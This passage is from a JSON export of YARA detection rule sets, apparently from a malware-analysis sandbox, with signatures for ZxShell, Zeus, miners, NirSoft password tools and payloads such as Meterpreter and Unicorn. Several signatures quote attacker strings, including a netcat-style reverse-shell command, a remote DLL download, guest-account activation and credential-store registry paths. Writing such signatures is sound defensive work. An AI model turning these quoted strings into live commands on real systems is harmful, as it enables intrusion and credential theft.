vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Xylitol xylitol@malwareint.com\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Windows_Malware_Zeus\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $protocol1 = \"X_ID: \"\n        $protocol2 = \"X_OS: \"\n        $protocol3 = \"X_BV: \"\n        $stringR1 = \"InitializeSecurityDescriptor\"\n        $stringR2 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)\"\n\n    condition:\n        (uint16(0) == 0x5a4d and all of ($protocol*) and ($stringR1 or $stringR2))\n}\n\nrule ZxShell_Related_Malware_CN_Group_Jul17_1\n{\n    meta:\n        description = \"ZxShell backdoor\"\n        ref = \"https://blogs.rsa.com/cat-phishing/\"\n        classifications = \"Backdoor\"\n        threat_names = \"ZxShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ZxShell_Related_Malware_CN_Group_Jul17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"CMD.EXE /C NET USER GUEST /ACTIVE:yes && NET USER GUEST ++++++\" ascii\n        $x2 = \"system\\\\cURRENTcONTROLSET\\\\sERVICES\\\\tERMSERVICE\" fullword ascii\n        $x3 = \"\\\\secivreS\\\\teSlortnoCtnerruC\\\\METSYS\" fullword ascii\n        $x4 = \"system\\\\cURRENTCONTROLSET\\\\cONTROL\\\\tERMINAL sERVER\" fullword ascii\n        $x5 = \"sOFTWARE\\\\mICROSOFT\\\\iNTERNET eXPLORER\\\\mAIN\" fullword ascii\n        $x6 = \"eNABLEaDMINtsREMOTE\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 1 of them)\n}\n\nrule ZxShell_Related_Malware_CN_Group_Jul17_2\n{\n    meta:\n        description = \"ZxShell backdoor\"\n        ref = \"https://blogs.rsa.com/cat-phishing/\"\n        classifications = \"Backdoor\"\n        threat_names = \"ZxShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ZxShell_Related_Malware_CN_Group_Jul17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $u1 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)\" fullword ascii\n        $u2 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)\" fullword ascii\n        $u3 = \"User-Agent:Mozilla/5.0 (X11; U; Linux i686; en-US; re:1.4.0) Gecko/20080808 Firefox/%d.0\" fullword ascii\n        $u4 = \"User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword ascii\n        $x1 = \"\\\\\\\\%s\\\\admin$\\\\g1fd.exe\" fullword ascii\n        $x2 = \"C:\\\\g1fd.exe\" fullword ascii\n        $x3 = \"\\\\\\\\%s\\\\C$\\\\NewArean.exe\" fullword ascii\n        $x4 = \"at \\\\\\\\%s %d:%d %s\" fullword ascii\n        $s1 = \"%c%c%c%c%ccn.exe\" fullword ascii\n        $s2 = \"hra%u.dll\" fullword ascii\n        $s3 = \"Referer: http://%s:80/http://%s\" fullword ascii\n        $s5 = \"Accept-Language: zh-cn\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and (1 of ($x*) or 3 of them)\n}\n\nrule ZxShell_Related_Malware_CN_Group_Jul17_3\n{\n    meta:\n        description = \"ZxShell backdoor\"\n        ref = \"https://blogs.rsa.com/cat-phishing/\"\n        classifications = \"Backdoor\"\n        threat_names = \"ZxShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ZxShell_Related_Malware_CN_Group_Jul17_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s\\\\nt%s.dll\" fullword ascii\n        $s2 = \"RegQueryValueEx(Svchost\\\\netsvcs)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and all of them)\n}\n\nrule ZxShell_Jul17\n{\n    meta:\n        description = \"ZxShell backdoor\"\n        ref = \"https://blogs.rsa.com/cat-phishing/\"\n        classifications = \"Backdoor\"\n        threat_names = \"ZxShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ZxShell_Jul17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"zxplug -add\" fullword ascii\n        $x2 = \"getxxx c:\\\\xyz.dll\" fullword ascii\n        $x3 = \"downfile -d c:\\\\windows\\\\update.exe\" fullword ascii\n        $x4 = \"-fromurl http://x.x.x/x.dll\" fullword ascii\n        $x5 = \"ping 127.0.0.1 -n 7&cmd.exe /c net start %s\" fullword ascii\n        $x6 = \"ZXNC -e cmd.exe x.x.x.x\" fullword ascii\n        $x7 = \"(bind a cmdshell)\" fullword ascii\n        $x8 = \"ZXFtpServer 21 20 zx\" fullword ascii\n        $x9 = \"ZXHttpServer\" fullword ascii\n        $x10 = \"c:\\\\error.htm,.exe|c:\\\\a.exe,.zip|c:\\\\b.zip\\\"\" fullword ascii\n        $x11 = \"c:\\\\windows\\\\clipboardlog.txt\" fullword ascii\n        $x12 = \"AntiSniff -a wireshark.exe\" fullword ascii\n        $x13 = \"c:\\\\windows\\\\keylog.txt\" fullword ascii\n\n    condition:\n        (filesize < 10000KB and 1 of them) or 3 of them\n}\n\nrule ZXshell_20171211_chrsben\n{\n    meta:\n        description = \"ZxShell backdoor\"\n        ref = \"https://goo.gl/snc85M\"\n        classifications = \"Backdoor\"\n        threat_names = \"ZxShell\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ZXshell_20171211_chrsben\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"ncProxyXll\" fullword ascii\n        $s1 = \"Uniscribe.dll\" fullword ascii\n        $s2 = \"GetModuleFileNameDll\" fullword ascii\n        $s4 = \"$Hangzhou Shunwang Technology Co.,Ltd0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and (pe.imphash() == \"de481441d675e9aca4f20bd8e16a5faa\" or pe.exports(\"PerfectWorld\") or pe.exports(\"ncProxyXll\") or 1 of ($x*) or 2 of them)\n}",
      "send_mail": false,
      "shareable": true
    },
    "8": {
      "builtin": true,
      "builtin_name": "PUAs",
      "created": "2020-05-10 14:25:02.654965",
      "id": 8,
      "modified": "2020-08-27 12:53:30.383460",
      "name": "PUAs",
      "owner_user_id": null,
      "rules": "\n\nrule CoinMiner_Strings\n{\n    meta:\n        description = \"Crypto mining pool protocol strings; PUA\"\n        ref = \"https://minergate.com/faq/what-pool-address\"\n        classifications = \"PUA\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CoinMiner_Strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"stratum+tcp://\" ascii\n        $s2 = \"\\\"normalHashing\\\": true,\"\n\n    condition:\n        filesize < 600KB and 1 of them\n}\n\nrule CoinHive_Javascript_MoneroMiner\n{\n    meta:\n        description = \"CoinHive: JavaScript crypto miner; PUA\"\n        ref = \"https://coinhive.com/documentation/miner\"\n        classifications = \"PUA\"\n        threat_names = \"CoinHive\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CoinHive_Javascript_MoneroMiner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"CoinHive.CONFIG.REQUIRES_AUTH\" fullword ascii\n\n    condition:\n        filesize < 65KB and 1 of them\n}\n\nrule InstallRex_AntiFWb\n{\n    meta:\n        description = \"InstallRex installer; PUA\"\n        classifications = \"PUA\"\n        threat_names = \"InstallRex\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PUP_InstallRex_AntiFWb\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s4 = \"Error %u while loading TSU.DLL %ls\" fullword ascii\n        $s7 = \"GetModuleFileName() failed => %u\" fullword ascii\n        $s8 = \"TSULoader.exe\" fullword wide\n        $s15 = \"\\\\StringFileInfo\\\\%04x%04x\\\\Arguments\" fullword wide\n        $s17 = \"Tsu%08lX.dll\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule MailPassview\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Nirsoft MailPassView\"\n        classifications = \"Spyware\"\n        threat_names = \"MailPassView\"\n        vti_default_score = 2\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n\n    strings:\n        $nirsoft1 = \"NirSoft\" wide ascii\n        $nirsoft2 = \"nirsoft\" wide ascii\n        $param1 = \"/stext\" ascii\n        $param2 = \"/shtml\" ascii\n        $param3 = \"/sverhtml\" ascii\n        $param4 = \"/sxml\" ascii\n        $param5 = \"/stab\" ascii\n        $param6 = \"/scomma\" ascii\n\n        $mailpassview = \"Mail   PassView\" wide\n\n        $steal01 = \"Software\\\\Classes\\\\Software\\\\Qualcomm\\\\Eudora\" ascii\n        $steal02 = \"Software\\\\Mozilla\\\\Mozilla Thunderbird\"\n        // note the typo USer\n        $steal03 = \"SMTP USer Name\" ascii\n        $steal04 = \"POP3 Server\" ascii\n        $steal05 = \"IMAP Server\" ascii\n        $steal06 = \"HTTPMail Server\" ascii\n        $steal07 = \"SMTP Server\" ascii\n        $steal08 = \"POP3 Password2\" ascii\n        $steal09 = \"IMAP Password2\" ascii\n        $steal10 = \"HTTPMail Password2\" ascii\n        $steal11 = \"SMTP Password2\" ascii\n\n        $steal12 = \"Software\\\\Microsoft\\\\Internet Account Manager\\\\Accounts\" ascii\n        $steal13 = \"Software\\\\Microsoft\\\\Office\\\\Outlook\\\\OMI Account Manager\\\\Accounts\" ascii\n        $steal14 = \"Software\\\\Google\\\\Google Talk\\\\Accounts\" ascii\n        $steal15 = \"Software\\\\Google\\\\Google Desktop\\\\Mailboxes\" ascii\n\n        $steal16 = \"5e7e8100-9138-11d1-945a-00c04fc308ff\" ascii\n        $steal17 = \"00000000-0000-0000-0000-000000000000\" ascii\n        $steal18 = \"220D5CD0-853A-11D0-84BC-00C04FD43F8F\" ascii\n        $steal19 = \"220D5CD1-853A-11D0-84BC-00C04FD43F8F\" ascii\n        $steal20 = \"220D5CC1-853A-11D0-84BC-00C04FD43F8F\" ascii\n        $steal21 = \"417E2D75-84BD-11D0-84BB-00C04FD43F8F\" ascii\n\n        $pdb = \"c:\\\\Projects\\\\VS2005\\\\mailpv\\\\Command-Line\\\\mailpv.pdb\" ascii\n\n    condition:\n       all of them\n}\n\nrule WebBrowserPassView\n{\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Nirsoft WebBrowserPassView\"\n        threat_names = \"WebBrowserPassView\"\n        classifications = \"Spyware\"\n        vti_default_score = 2\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n\n    strings:\n        $nirsoft1 = \"NirSoft\" wide ascii\n        $nirsoft2 = \"nirsoft\" wide ascii\n\n        $param01 = \"/stext\" wide\n        $param02 = \"/shtml\" wide\n        $param03 = \"/sverhtml\" wide\n        $param04 = \"/sxml\" wide\n        $param05 = \"/stab\" wide\n        $param06 = \"/scomma\" wide\n        $param07 = \"/stabular\" wide\n        $param08 = \"/scomma\" wide\n        $param09 = \"/skeepass\" wide\n        $param10 = \"/savelangfile\" wide\n        $param11 = \"/deleteregkey\" wide\n\n        $webbrowserpassview = \"WebBrowserPassView\" wide ascii\n\n        $api01 = \"CredEnumerateA\" ascii\n        $api02 = \"CredEnumerateW\" ascii\n\n        $firefox01 = \"FROM moz_logins\" ascii\n        $firefox02 = \"PK11_CheckUserPassword\" ascii\n        $firefox03 = \"PK11_Authenticate\" ascii\n\n        $loadpass00 = \"LoadPasswordsIE\" wide\n        $loadpass01 = \"LoadPasswordsFirefox\" wide\n        $loadpass02 = \"LoadPasswordsChrome\" wide\n        $loadpass03 = \"LoadPasswordsOpera\" wide\n        $loadpass04 = \"LoadPasswordsSafari\" wide\n        $loadpass05 = \"LoadPasswordsSeaMonkey\" wide\n        $loadpass06 = \"LoadPasswordsYandex\" wide\n\n        $keepass = \"KeePass csv file\" wide\n\n        $pdb = \"c:\\\\Projects\\\\VS2005\\\\WebBrowserPassView\\\\Command-Line\\\\WebBrowserPassView.pdb\" ascii\n\n    condition:\n       all of them\n}\n\nrule Netpass {\n    meta:\n        author = \"VMRay Labs\"\n        description = \"Nirsoft Netpass\"\n        classifications = \"Spyware\"\n        threat_names = \"Netpass\"\n        vti_default_score = 2\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n    strings:\n        $nirsoft = \"NirSoft\" wide\n        $netpass = \"Network  Password  Recovery\" wide\n    condition:\n        all of them\n}\n\nrule WinDivert_Driver\n{\n    meta:\n        description = \"WinDivert: user-Mode packet capturing driver; PUA\"\n        ref = \"https://www.reqrypt.org/windivert.html\"\n        classifications = \"PUA\"\n        threat_names = \"WinDivert\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WinDivert_Driver\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"WinDivertDllEntry\" fullword ascii\n        $s2 = \"WinDivertHelperParseIPv4Address\" fullword ascii\n        $s3 = \"WinDivert (web: http://reqrypt.org/windivert.html)\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and 1 of them)\n}\n\nrule XMRIG_Miner\n{   \n    meta:\n        description = \"XMRIG: Monero mining software; PUA\"\n\t\tref = \"https://github.com/xmrig/xmrig/\"\n        classifications = \"PUA, Miner\"\n        threat_names = \"XMRIG\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $s01 = \"XMRig\"\n\t\t$s02 = \"nicehash.com\"\n\t\t$s03 = \"tls-fingerprint\"\n\t\t$s04 = \"stratum+tcp://\"\n\t\t$s05 = \"stratum+ssl://\"\n\t\t$s06 = \"cryptonight.\"\n\t\t$s07 = \"cryptonightv7.\"\n\t\t$s08 = \"cryptonightheavy.\"\n\t\t$s09 = \"cryptonightv8.\"\n\t\t$s10 = \".minergate.com\"\n\t\t$s11 = \"xmr.pool.\"\n\t\t$s12 = \"aeon.pool\"\n\t\t$s13 = \"worker-id\"\n\t\t$s14 = \"no active pools, stop mining\"\n\t\t$s15 = \"CryptonightR\"\n\t\t$s16 = \"<UV_THREADPOOL_SIZE\"\n\t\t$s17 = \"src/threadpool.c\"\n\t\t$s18 = \"* COMMANDS:     'h' hashrate, 'p' pause, 'r' resume\" fullword ascii\n\t\t\n\t\t// Command-line arguments\n\t\t$c19 = \"specify the algorithm to use\"\n\t\t$c20 = \"URL of mining server\"\n\t\t$c21 = \"username:password pair for mining server\"\n\t\t$c22 = \"username for mining server\"\n\t\t$c23 = \"password for mining server\"\n\t\t$c24 = \"rig identifier for pool-side statistics (needs pool support)\"\n\t\t$c25 = \"number of miner threads\"\n\t\t$c26 = \"set process affinity to CPU core(s), mask 0x3 for cores 0 and 1\"\n\t\t$c27 = \"set process priority (0 idle, 2 normal to 5 highest)\"\n\t\t$c30 = \"algorithm PoW variant\"\n\t\t$c31 = \"donate level, default 5%% (5 minutes in 100 minutes)\"\n\t\t$c32 = \"set custom user-agent string for pool\"\n\t\t$c33 = \"print hashrate report every N seconds\"\n\t\t$c34 = \"port for the miner API\"\n\t\t\n\t\t// Format strings\n\t\t$f35 = \"%-13s%s/%s %s\"\n\t\t$f36 = \"%-13slibuv/%s %s\"\n\t\t$f37 = \"%-13s%s (%d) %sx64 %sAES %sAVX2\"\n\t\t$f38 = \"%-13s%.1f MB/%.1f MB\"\n\t\t$f39 = \"%-13s%d, %s, av=%d, %sdonate=%d%%%s\"\n\t\t$f40 = \"%-13sauto:%s\"\n\t\t$f41 = \"POOL #%-7zu%s%s variant=%s %s\"\n\t\t$f42 = \"{\\\"id\\\":%lld,\\\"jsonrpc\\\":\\\"2.0\\\",\\\"method\\\":\\\"keepalived\\\",\\\"params\\\":{\\\"id\\\":\\\"%s\\\"}}\"\n\t\t$f43 = \"[%s] duplicate job received, reconnect\"\n\t\t$f44 = \"%s| THREAD | AFFINITY | 10s H/s | 60s H/s | 15m H/s |\"\n\t\t$f45 = \"READY (CPU) threads %zu(%zu) huge pages %zu/%zu %1.0f%% memory %zu KB\"\n\t\t$f46 = \"use pool %s:%d %s %s\"\n\t\t$f47 = \"rejected (%lld/%lld) diff %u \\\"%s\\\" (%llu ms)\"\n\t\t$f48 = \"accepted (%lld/%lld) diff %u (%llu ms)\"\n        $f49 = \"* VERSIONS:     XMRig/%s libuv/%s%s\" fullword ascii\n\n\t\t\n\t\t\n    condition:\n\t\t// Memory dump, function string file or file with PE header\n\t\t(\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n\t\tand 3 of ($s*)\n\t\tand\n\t\t( \n\t\t\t(5 of ($c*)) \n\t\t\tor (5 of ($f*)) \n\t\t)\n\t\t\t\t\n}",
      "send_mail": false,
      "shareable": true
    },
    "9": {
      "builtin": true,
      "builtin_name": "Payloads",
      "created": "2020-05-10 14:25:02.654965",
      "id": 9,
      "modified": "2020-08-27 12:53:30.388408",
      "name": "Payloads",
      "owner_user_id": null,
      "rules": "\n\nrule Backdoors_custom_ssh_backdoor_server\n{\n    meta:\n        description = \"SSH backdoor based on Python and Paramiko\"\n        ref = \"https://goo.gl/S46L3o\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"custom_ssh_backdoor_server\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"command= raw_input(\\\"Enter command: \\\").strip('n')\" fullword ascii\n        $s1 = \"print '[-] (Failed to load moduli -- gex will be unsupported.)'\" fullword ascii\n        $s2 = \"print '[-] Listen/bind/accept failed: ' + str(e)\" fullword ascii\n        $s3 = \"chan.send(command)\" fullword ascii\n        $s4 = \"print '[-] SSH negotiation failed.'\" fullword ascii\n        $s5 = \"except paramiko.SSHException, x:\" fullword ascii\n\n    condition:\n        filesize < 10KB and 5 of them\n}\n\nrule Backdoors_CHAOS_Payload\n{\n    meta:\n        description = \"CHAOS backconnect payload\"\n        ref = \"https://github.com/tiagorlampert/CHAOS\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CHAOS_Payload\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = { 2F 43 48 41 4F 53 00 02 73 79 6E 63 2F 61 74 6F 6D 69 63 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 15000KB and all of them)\n}\n\nrule Backdoors_python_reverse_shell\n{\n    meta:\n        description = \"Python base64-encoded reverse shell\"\n        ref = \"https://www.virustotal.com/en/file/9ec5102bcbabc45f2aa7775464f33019cfbe9d766b1332ee675957c923a17efd/analysis/\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"John Lambert @JohnLaTwC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"gen_python_reverse_shell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $h1 = \"import base64\" fullword ascii\n        $s1 = \"b64decode\" fullword ascii\n        $s2 = \"lambda\" fullword ascii\n        $s3 = \"version_info\" fullword ascii\n        $enc_x0 = /(AG8AYwBrAGUAdAAuAFMATwBDAEsAXwBTAFQAUgBFAEEATQ|b2NrZXQuU09DS19TVFJFQU|c29ja2V0LlNPQ0tfU1RSRUFN|cwBvAGMAawBlAHQALgBTAE8AQwBLAF8AUwBUAFIARQBBAE0A|MAbwBjAGsAZQB0AC4AUwBPAEMASwBfAFMAVABSAEUAQQBNA|NvY2tldC5TT0NLX1NUUkVBT)/ ascii\n        $enc_x1 = /(4AYwBvAG4AbgBlAGMAdAAoACgA|5jb25uZWN0KC|AGMAbwBuAG4AZQBjAHQAKAAoA|LgBjAG8AbgBuAGUAYwB0ACgAKA|LmNvbm5lY3QoK|Y29ubmVjdCgo)/\n        $enc_x2 = /(AGkAbQBlAC4AcwBsAGUAZQBwA|aW1lLnNsZWVw|dABpAG0AZQAuAHMAbABlAGUAcA|dGltZS5zbGVlc|QAaQBtAGUALgBzAGwAZQBlAHAA|RpbWUuc2xlZX)/\n        $enc_x3 = /(4AcgBlAGMAdg|5yZWN2|AHIAZQBjAHYA|cmVjd|LgByAGUAYwB2A|LnJlY3)/\n\n    condition:\n        uint32be(0) == 0x696d706f and $h1 at 0 and filesize < 40KB and all of ($s*) and all of ($enc_x*)\n}\n\nrule Backdoors_Meterpreter_Reverse_Tcp\n{\n    meta:\n        description = \"Meterpreter reverse TCP backdoor\"\n        classifications = \"Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"chort (@chort0)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Meterpreter_Reverse_Tcp\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 4d 45 54 45 52 50 52 45 54 45 52 5f 54 52 41 4e 53 50 4f 52 54 5f 53 53 4c [32-48] 68 74 74 70 73 3a 2f 2f 58 58 58 58 58 58 }\n        $b = { 4d 45 54 45 52 50 52 45 54 45 52 5f 55 41 }\n        $c = { 47 45 54 20 2f 31 32 33 34 35 36 37 38 39 20 48 54 54 50 2f 31 2e 30 }\n        $d = { 6d 65 74 73 72 76 2e 64 6c 6c [2-4] 52 65 66 6c 65 63 74 69 76 65 4c 6f 61 64 65 72 }\n\n    condition:\n        $a or (any of ($b , $d) and $c)\n}\n\nrule EICAR\n{\n    meta:\n        description = \"Eicar test file\"\n        threat_names = \"EICAR\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\" fullword ascii\n\n    condition:\n        filesize == 68\n        and $s1 at 0\n}\n\nrule EICAR_String\n{\n    meta:\n        description = \"Eicar test pattern\"\n        threat_names = \"EICAR\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Marc Rivero | @seifreed\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"eicar\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\" fullword ascii\n\n    condition:\n        $s1\n}\n\nrule exe2hex : toolkit\n{\n    meta:\n        description = \"Payload generated by exe2hex\"\n        threat_names = \"exe2hex\"\n        ref = \"https://github.com/g0tmi1k/exe2hex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Payload_Exe2Hex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"set /p \\\"=4d5a\" ascii\n        $a2 = \"powershell -Command \\\"$hex=\" ascii\n        $b1 = \"set+%2Fp+%22%3D4d5\" ascii\n        $b2 = \"powershell+-Command+%22%24hex\" ascii\n        $c1 = \"echo 4d 5a \" ascii\n        $c2 = \"echo r cx >>\" ascii\n        $d1 = \"echo+4d+5a+\" ascii\n        $d2 = \"echo+r+cx+%3E%3E\" ascii\n\n    condition:\n        all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)\n}\n\nrule Unicorn_obfuscated_powershell\n{\n    meta:\n        description = \"PowerShell payload obfuscated by Unicorn toolkit\"\n        threat_names = \"Unicorn\"\n        ref = \"https://github.com/trustedsec/unicorn/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"John Lambert @JohnLaTwC\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"gen_unicorn_obfuscated_powershell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $h1 = \"powershell\"\n        $sa1 = \".value.toString() 'JAB\"\n        $sa2 = \".value.toString() ('JAB\"\n        $sb1 = \"-w 1 -C \\\"s\"\n        $sb2 = \"/w 1 /C \\\"s\"\n\n    condition:\n        filesize < 20KB and uint32be(0) == 0x706f7765 and $h1 at 0 and (uint16be(filesize - 2) == 0x2722 or (uint16be(filesize - 2) == 0x220a and uint8(filesize - 3) == 0x27) or (uint16be(filesize - 2) == 0x2922 and uint8(filesize - 3) == 0x27)) and (1 of ($sa*) and 1 of ($sb*))\n}\n\nrule Laudanum_asp_file\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: file.asp)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"asp_file\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"' *** Written by Tim Medin <tim@counterhack.com>\" fullword ascii\n        $s2 = \"Response.BinaryWrite(stream.Read)\" fullword ascii\n        $s3 = \"Response.Write(Response.Status & Request.ServerVariables(\\\"REMOTE_ADDR\\\"))\" fullword ascii\n        $s4 = \"%><a href=\\\"<%=Request.ServerVariables(\\\"URL\\\")%>\\\">web root</a><br/><%\" fullword ascii\n        $s5 = \"set folder = fso.GetFolder(path)\" fullword ascii\n        $s6 = \"Set file = fso.GetFile(filepath)\" fullword ascii\n\n    condition:\n        uint16(0) == 0x253c and filesize < 30KB and 5 of them\n}\n\nrule Laudanum_php_killnc\n{\n    meta:\n        description = \"Laudanum Injector Tools (file: killnc.php)\"\n        ref = \"http://laudanum.inguardians.com/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Laudanum Injector\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"php_killnc\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"if 